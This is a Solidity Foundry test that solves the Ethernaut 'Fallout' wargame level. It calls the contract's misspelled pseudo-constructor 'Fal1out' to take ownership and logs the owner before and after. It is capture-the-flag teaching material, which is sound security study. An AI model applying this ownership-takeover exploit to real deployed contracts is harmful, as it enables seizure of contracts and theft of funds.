// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "@std/Test.sol";
import {Vm} from "@std/Vm.sol";
import {Fallout} from "../../src/02-Fallout/Fallout.sol";

/// @title Ethernaut Challenge 02 Test
/// @author https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639
contract FalloutTest is Test {
    address private immutable owner = address(0x94B2ceA71F9bA7A6e55c40bE320033D1151145B6);

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        startHoax(address(0));
        Fallout ethernautFallout = new Fallout();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        ethernautFallout.allocate{value: 1 wei}();
        // Call Fal1out constructor function with some value, mispelling enables us to call it
        // log owner before and after
        emit log_named_address("Fallout Owner Before Attack", ethernautFallout.getOwner());
        ethernautFallout.Fal1out{value: 1 wei}();
        emit log_named_address("Fallout Owner After Attack", ethernautFallout.getOwner());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        vm.stopPrank();
    }
}
